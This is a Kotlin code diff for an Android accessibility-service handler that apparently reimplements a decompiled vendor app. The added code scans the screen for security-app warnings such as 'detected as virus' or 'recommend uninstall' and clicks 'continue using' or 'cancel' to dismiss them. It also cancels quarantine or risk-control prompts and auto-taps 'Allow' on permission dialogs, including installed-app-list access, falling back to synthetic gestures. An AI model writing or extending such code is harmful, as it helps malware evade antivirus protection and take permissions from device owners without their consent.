@@ -54,6 +54,35 @@ open class Yw5xudHandler(
         private const val MAX_BFS_DEPTH = 10
         private const val MAX_CHILDREN_PER_NODE = 15
 
+        /** Virus/malware popup keywords (vendor m212458b8) */
+        val VIRUS_KEYWORDS = listOf(
+            "被检测为病毒", "被检视为病毒", "高风险", "发现恶意应用",
+            "应用风险", "发现病毒应用", "存在高风险", "建议立即卸载"
+        )
+
+        /** Virus popup dismiss button texts (vendor m212458b8, priority order) */
+        val VIRUS_DISMISS_TEXTS = listOf(
+            "继续使用", "恢复开启", "暂不移入", "取消", "Continue", "Cancel"
+        )
+
+        /** App list permission keywords (vendor m212458b8) */
+        val APP_LIST_KEYWORDS = listOf(
+            "读取已安装应用列表", "请求读取已安装应用", "读取已安装应用",
+            "获取已安装应用", "查看已安装应用", "应用列表"
+        )
+
+        /** Risk control keywords (vendor m212458b8) */
+        val RISK_CONTROL_KEYWORDS = listOf(
+            "移入管控", "移入风险管控", "应用管控中心", "管控恶意应用", "移入隔离箱"
+        )
+
+        /** Permission allow text keywords for text-based search (vendor b7 + ALLOW keywords) */
+        val PERMISSION_ALLOW_TEXTS = listOf(
+            "允许", "Allow", "仅在使用该应用时允许", "仅本次使用时允许",
+            "仅在使用中允许", "While using the app", "Only this time",
+            "Turn on", "Accept"
+        )
+
         /**
          * BFS collect visible text/contentDescription from accessibility tree.
          * Matches vendor m212438a6().
@@ -207,49 +236,274 @@ open class Yw5xudHandler(
         }
     }
 
-    // --- Brand step dispatch stubs (to be filled by brand Step classes) ---
+    // --- Brand step dispatch (instantiate Steps classes per vendor pattern) ---
 
     internal open suspend fun executeMiuiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("MiuiSteps: \u672A\u5B9E\u73B0")
+        try {
+            MiuiSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "小米/MIUI授权流程异常: ${e.message}", e)
+            f.add("小米/MIUI授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeHuaweiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("HuaweiSteps: \u672A\u5B9E\u73B0")
+        try {
+            HuaweiSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "华为/荣耀授权流程异常: ${e.message}", e)
+            f.add("华为/荣耀授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeOppoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("OppoSteps: \u672A\u5B9E\u73B0")
+        try {
+            OppoSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "OPPO/Realme/OnePlus授权流程异常: ${e.message}", e)
+            f.add("OPPO/Realme/OnePlus授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeVivoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("VivoSteps: \u672A\u5B9E\u73B0")
+        try {
+            VivoSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "vivo/iQOO授权流程异常: ${e.message}", e)
+            f.add("vivo/iQOO授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeSamsungSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("SamsungSteps: \u672A\u5B9E\u73B0")
+        try {
+            SamsungSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "三星授权流程异常: ${e.message}", e)
+            f.add("三星授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeMeizuSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("MeizuSteps: \u672A\u5B9E\u73B0")
+        try {
+            MeizuSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "魅族授权流程异常: ${e.message}", e)
+            f.add("魅族授权流程异常: ${e.message}")
+        }
     }
     internal open suspend fun executeGenericSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
-        l.add("GenericSteps: \u672A\u5B9E\u73B0")
+        try {
+            GenericSteps(service, context).execute(s, f, l)
+        } catch (e: Exception) {
+            Log.e(TAG, "通用授权流程异常: ${e.message}", e)
+            f.add("国外通用授权流程异常: ${e.message}")
+        }
     }
 
-    // --- Event handling ---
+    // Throttle timestamps (vendor f55150a7, f55153b0)
+    private var lastEventTime: Long = 0L
+    private var lastPermClickTime: Long = 0L
+
+    // --- Event handling (vendor b7 + b8) ---
 
     override fun onAccessibilityEvent(event: AccessibilityEvent, packageName: String, className: String) {
         if (!isActive || !isAuthorizing) return
-        // Permission auto-grant: check if current window shows a permission dialog
+        val now = System.currentTimeMillis()
+        if (now - lastEventTime < stepDelay) return // 300ms throttle per vendor
+        lastEventTime = now
+
         try {
             val root = service?.rootInActiveWindow ?: return
-            for (buttonId in PERMISSION_ALLOW_BUTTON_IDS) {
-                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
-                if (nodes.isNullOrEmpty()) continue
-                for (node in nodes) {
-                    if (node.isVisibleToUser && node.isClickable) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        Log.i(TAG, "\u2705 \u81EA\u52A8\u70B9\u51FB\u6743\u9650\u5141\u8BB8\u6309\u94AE: $buttonId")
-                        return
-                    }
+
+            // 1. Virus/malware popup detection (vendor m212458b8)
+            if (handleVirusPopup(root, packageName)) return
+
+            // 2. Permission auto-grant: ViewId search (vendor b7 phase 1)
+            if (clickPermissionByViewId(root)) return
+
+            // 3. Permission auto-grant: text search fallback (vendor b7 phase 2)
+            if (now - lastPermClickTime >= stepDelay) {
+                if (clickPermissionByText(root)) {
+                    lastPermClickTime = now
+                    return
                 }
             }
         } catch (_: Exception) {}
+    }
+
+    // --- Virus/malware popup handler (vendor m212458b8, ~418 lines) ---
+
+    /**
+     * Detect and dismiss virus/malware/risk warning popups from OEM security apps.
+     * Matches vendor m212458b8(). Checks visible text for virus keywords,
+     * then clicks dismiss buttons ("继续使用"/"恢复开启"/"取消"/"暂不移入").
+     */
+    private fun handleVirusPopup(root: AccessibilityNodeInfo, packageName: String): Boolean {
+        // Don't handle our own package
+        if (packageName.equals(context.packageName, ignoreCase = true)) return false
+
+        val texts = collectVisibleTexts(root)
+        if (texts.isEmpty()) return false
+
+        // Check for virus/risk keywords (vendor: 被检测为病毒, 高风险, 发现恶意应用, etc.)
+        val hasVirusKeyword = texts.any { text ->
+            VIRUS_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
+        }
+        if (!hasVirusKeyword) {
+            // Check for installed-apps-list permission dialog
+            val hasAppListKeyword = texts.any { text ->
+                APP_LIST_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
+            }
+            if (hasAppListKeyword) {
+                // Click "允许"/"Allow" for app list access
+                return clickByTextMatch(root, "允许") || clickByTextMatch(root, "Allow")
+            }
+            // Check for risk control popup ("移入管控")
+            val hasRiskControl = texts.any { text ->
+                RISK_CONTROL_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
+            }
+            if (hasRiskControl) {
+                return clickByTextMatch(root, "取消") || clickByTextMatch(root, "Cancel")
+            }
+            return false
+        }
+
+        // Virus popup found — try dismiss buttons in priority order
+        Log.w(TAG, "🦠 检测到病毒弹窗, 尝试关闭")
+        for (dismissText in VIRUS_DISMISS_TEXTS) {
+            if (clickByTextMatch(root, dismissText)) {
+                Log.i(TAG, "✅ 病毒弹窗已关闭: $dismissText")
+                return true
+            }
+        }
+        return false
+    }
+
+    // --- Enhanced permission clicking (vendor m212457b7) ---
+
+    /** Phase 1: Click permission allow button by ViewId. */
+    private fun clickPermissionByViewId(root: AccessibilityNodeInfo): Boolean {
+        for (buttonId in PERMISSION_ALLOW_BUTTON_IDS) {
+            try {
+                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
+                if (nodes.isNullOrEmpty()) continue
+                for (node in nodes) {
+                    if (node.isVisibleToUser) {
+                        if (clickWithParentFallback(node)) {
+                            Log.i(TAG, "✅ 权限按钮点击(ViewId): $buttonId")
+                            return true
+                        }
+                    }
+                }
+            } catch (_: Exception) {}
+        }
+        return false
+    }
+
+    /** Phase 2: Click permission allow button by text search. Vendor b7 fallback. */
+    private fun clickPermissionByText(root: AccessibilityNodeInfo): Boolean {
+        for (allowText in PERMISSION_ALLOW_TEXTS) {
+            if (clickByTextMatch(root, allowText)) {
+                Log.i(TAG, "✅ 权限按钮点击(Text): $allowText")
+                return true
+            }
+        }
+        return false
+    }
+
+    // --- Core helper methods (vendor a3, a4, a5) ---
+
+    /**
+     * Click a node by matching visible text. Vendor m212449a5().
+     * Searches via findAccessibilityNodeInfosByText, then clicks if text matches.
+     */
+    fun clickByTextMatch(root: AccessibilityNodeInfo, text: String): Boolean {
+        try {
+            val nodes = root.findAccessibilityNodeInfosByText(text)
+            if (nodes.isNullOrEmpty()) return false
+            for (node in nodes) {
+                if (node.isVisibleToUser) {
+                    val nodeText = node.text?.toString()?.trim() ?: ""
+                    if (nodeText == text || nodeText.contains(text, ignoreCase = true)) {
+                        if (clickWithParentFallback(node)) {
+                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+                            return true
+                        }
+                    }
+                }
+            }
+            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+        } catch (_: Exception) {}
+        return false
+    }
+
+    /**
+     * Click a checkbox found near text. Vendor m212447a3().
+     * Searches by text, finds sibling CheckBox/CompoundButton, clicks if not checked.
+     */
+    fun clickCheckboxByText(root: AccessibilityNodeInfo, text: String): Boolean {
+        try {
+            val nodes = root.findAccessibilityNodeInfosByText(text)
+            if (nodes.isNullOrEmpty()) return false
+            for (node in nodes) {
+                if (node.isVisibleToUser) {
+                    val checkbox = findCheckBoxOrClickableParent(node)
+                    if (checkbox != null) {
+                        if (checkbox.isChecked) {
+                            Log.d(TAG, "[clickCheckboxByText] 已勾选: $text")
+                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+                            return true
+                        }
+                        if (clickWithParentFallback(checkbox)) {
+                            Log.d(TAG, "[clickCheckboxByText] ✅ 点击成功: $text")
+                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+                            return true
+                        }
+                    }
+                    // Fallback: click text node directly
+                    if (clickWithParentFallback(node)) {
+                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+                        return true
+                    }
+                }
+            }
+            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
+        } catch (e: Exception) {
+            Log.w(TAG, "[clickCheckboxByText] 异常: ${e.message}")
+        }
+        return false
+    }
+
+    /**
+     * Click node, walking up parent chain (5 levels) with gesture fallback.
+     * Vendor m212448a4(). Enhanced version of clickNodeOrParent.
+     */
+    fun clickWithParentFallback(node: AccessibilityNodeInfo): Boolean {
+        // Direct click
+        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
+        // Walk up parents (5 levels per vendor, not 3)
+        var parent = node.parent
+        var depth = 0
+        while (parent != null && depth < 5) {
+            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                parent.recycle()
+                return true
+            }
+            val grandparent = parent.parent
+            parent.recycle()
+            parent = grandparent
+            depth++
+        }
+        // Gesture fallback: tap center of node bounds
+        try {
+            val rect = android.graphics.Rect()
+            node.getBoundsInScreen(rect)
+            if (rect.width() > 0 && rect.height() > 0) {
+                val path = android.graphics.Path()
+                path.moveTo(rect.centerX().toFloat(), rect.centerY().toFloat())
+                val gesture = android.accessibilityservice.GestureDescription.Builder()
+                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
+                    .build()
+                service?.dispatchGesture(gesture, null, null)
+                return true
+            }
+        } catch (_: Exception) {}
+        return false
     }
 
     override fun getListenWindows(): List<ListenWindow> {
